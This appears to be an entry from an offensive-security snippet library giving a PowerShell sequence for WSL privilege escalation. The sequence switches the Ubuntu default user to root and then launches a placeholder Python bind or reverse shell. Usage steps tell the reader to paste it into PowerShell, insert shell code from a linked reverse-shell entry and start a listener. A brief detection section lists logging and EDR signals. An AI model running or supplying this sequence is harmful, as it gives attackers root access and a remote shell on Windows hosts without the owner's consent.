---
id: bdf64b65-05a7-4bbf-a569-094f64ce6568
name: wsl-escalation-sequence
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:29.607477+00:00'
updated_at: '2023-04-10T20:37:54.961225+00:00'
platforms:
  - Windows
tags:
  - wsl
  - privilege-escalation
validated: true
---

# wsl-escalation-sequence

## Code

```powershell
wsl whoami
ubuntu.exe config --default-user root
wsl whoami
wsl python3 -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

## Description

This PowerShell sequence checks the current WSL user, sets the Ubuntu default user to root for escalation, verifies the change, and executes a placeholder Python reverse shell. It provides a quick way to perform the full escalation in one script block.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| BIND_OR_REVERSE_SHELL_PYTHON_CODE | Python code for bind or reverse shell payload | "import socket..." |
| ubuntu.exe | Ubuntu WSL executable (adjust for version) | ubuntu1604.exe |

## Usage

Paste this into a PowerShell session on a Windows host with WSL Ubuntu installed. Replace the Python placeholder with actual shell code (e.g., from [[codes/python-tcp-reverse-shell]]). Run after ensuring a listener is active for the reverse shell.

## Detection

- Monitor PowerShell execution logs for 'wsl' invocations and config changes.
- EDR alerts on ubuntu.exe with 'config' arguments.
- Network connections from wsl.exe to external IPs on non-standard ports.

## Related

- [[procedures/WSL-Privilege-Escalation-via-Default-User-Modification]]
